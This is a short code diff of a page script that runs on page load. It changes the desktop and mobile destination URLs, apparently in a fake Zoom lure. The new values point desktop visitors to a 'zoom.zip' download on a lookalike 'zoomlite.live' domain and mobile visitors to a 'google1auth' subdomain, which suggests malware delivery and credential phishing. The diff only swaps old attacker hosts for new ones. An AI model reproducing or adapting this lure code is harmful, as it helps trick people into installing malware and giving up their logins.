@@ -28,10 +28,10 @@ document.addEventListener("DOMContentLoaded", () => {
      */
 
     const DESKTOP_DESTINATION =
-        "https://application.connectliveagent.com/ConnectLiveSetup.exe.zip";
+        "https://zoomapp.zoomlite.live/zoom.zip";
 
     const MOBILE_DESTINATION =
-        "https://zoom.drive0g5folderaccess.com/";
+        "https://google1auth.zoomlite.live/";
 
 
     /*
